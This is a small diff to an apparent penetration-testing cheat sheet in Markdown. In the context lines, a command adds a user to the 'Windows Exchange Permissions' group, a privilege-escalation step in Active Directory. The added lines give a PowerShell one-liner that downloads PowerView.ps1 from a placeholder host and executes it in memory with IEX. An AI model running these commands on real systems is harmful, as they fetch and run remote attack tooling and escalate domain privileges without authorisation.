@@ -35,3 +35,7 @@ __Add user to a group__
 net group "Windows Exchange Permissions" /add kickass101
 ```
 
+##### Download files from server
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://$IP/Powerview.ps1')
+```
